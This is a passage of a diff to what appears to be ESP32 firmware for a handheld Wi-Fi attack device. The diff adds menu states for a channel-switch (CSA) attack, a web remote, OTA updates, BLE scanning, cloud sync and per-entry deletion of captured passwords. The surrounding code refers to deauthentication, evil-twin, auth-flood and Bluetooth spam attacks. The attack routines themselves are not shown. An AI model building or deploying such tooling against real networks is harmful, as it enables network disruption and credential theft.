@@ -1531,6 +2365,10 @@ void loop() {
   }
 
   if (currentState == MAIN_MENU) {
+    if (cfg_autosync_min > 0 && (millis() - lastAutoSync) >= (unsigned long)cfg_autosync_min * 60000UL) {
+      lastAutoSync = millis();
+      startCloudSync();
+    }
     if (digitalRead(BTN_TOP) == LOW) {
       delay(200);
       menuSelection = (menuSelection + 1) % MENU_COUNT;
@@ -1588,12 +2426,43 @@ void loop() {
           startKarmaScan();
           drawKarmaScan(0);
           break;
+        case 9: {
+          doScanAnimation();
+          if (apCount == -1) { drawMainMenu(); }
+          else if (apCount == 0) {
+            tft.fillScreen(TFT_BLACK);
+            drawHeader("NO WIFI FOUND", TFT_RED);
+            delay(1500); drawMainMenu();
+          } else {
+            currentState = AP_LIST_CSA;
+            selectedIdx = 0; apScrollPos = 0;
+            drawAPList();
+          }
+          break;
+        }
+        case 10:
+          currentState = WEB_REMOTE;
+          startWebRemote();
+          break;
+        case 11:
+          currentState = OTA_MODE;
+          startOTA();
+          break;
+        case 12:
+          currentState = BLE_SCAN;
+          startBLEScan();
+          break;
+        case 13:
+          currentState = CLOUD_SYNC;
+          startCloudSync();
+          break;
       }
     }
   }
   else if (currentState == AP_LIST_DEAUTH ||
            currentState == AP_LIST_EVIL_TWIN ||
-           currentState == AP_LIST_AUTH_FLOOD) {
+           currentState == AP_LIST_AUTH_FLOOD ||
+           currentState == AP_LIST_CSA) {
     handleAPListNavigation();
   }
   else if (currentState == TEMPLATE_SELECT) {
@@ -1609,6 +2478,14 @@ void loop() {
       delay(200);
       if (isDeauthRunning) stopDeauthEngine();
       currentState = MAIN_MENU; drawMainMenu();
+    }
+  }
+  else if (currentState == CSA_RUNNING) {
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300);
+      stopCSAAttack();
+      currentState = MAIN_MENU;
+      drawMainMenu();
     }
   }
   else if (currentState == EVIL_TWIN_RUNNING) {
@@ -1645,6 +2522,34 @@ void loop() {
       delay(300); stopBTSpam(); currentState = MAIN_MENU; drawMainMenu();
     }
   }
+  else if (currentState == WEB_REMOTE) {
+    dnsServer.processNextRequest();
+    server.handleClient();
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300);
+      stopWebRemote();
+      currentState = MAIN_MENU;
+      drawMainMenu();
+    }
+  }
+  else if (currentState == OTA_MODE) {
+    ArduinoOTA.handle();
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300);
+      stopOTA();
+      currentState = MAIN_MENU;
+      drawMainMenu();
+    }
+  }
+  else if (currentState == BLE_SCAN) {
+    if (g_bleScanning && millis() - lastUI > 500) { drawBleScan(); lastUI = millis(); }
+    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      delay(300);
+      stopBLEScan();
+      currentState = MAIN_MENU;
+      drawMainMenu();
+    }
+  }
   else if (currentState == VIEW_PASSWORDS) {
     int total = prefs.getInt("pwd_count", 0);
     int maxSelection = total + 1;
@@ -1664,6 +2569,15 @@ void loop() {
       else if (viewSelection == total) {
         if (!confirmDeleteAll) { confirmDeleteAll = true; lastDeletePress = millis(); drawViewPasswords(); }
         else { deleteAllPasswordsFromNVS(); confirmDeleteAll = false; viewSelection = 1; viewScrollPos = 0; drawViewPasswords(); }
+      }
+      else if (viewSelection < total) {
+        deletePasswordEntry(viewSelection);
+        confirmDeleteAll = false;
+        int newTotal = prefs.getInt("pwd_count", 0);
+        if (newTotal == 0) viewSelection = 1;
+        else if (viewSelection >= newTotal) viewSelection = newTotal - 1;
+        viewScrollPos = 0;
+        drawViewPasswords();
       }
     }
     if (confirmDeleteAll && millis() - lastDeletePress > 3000) {
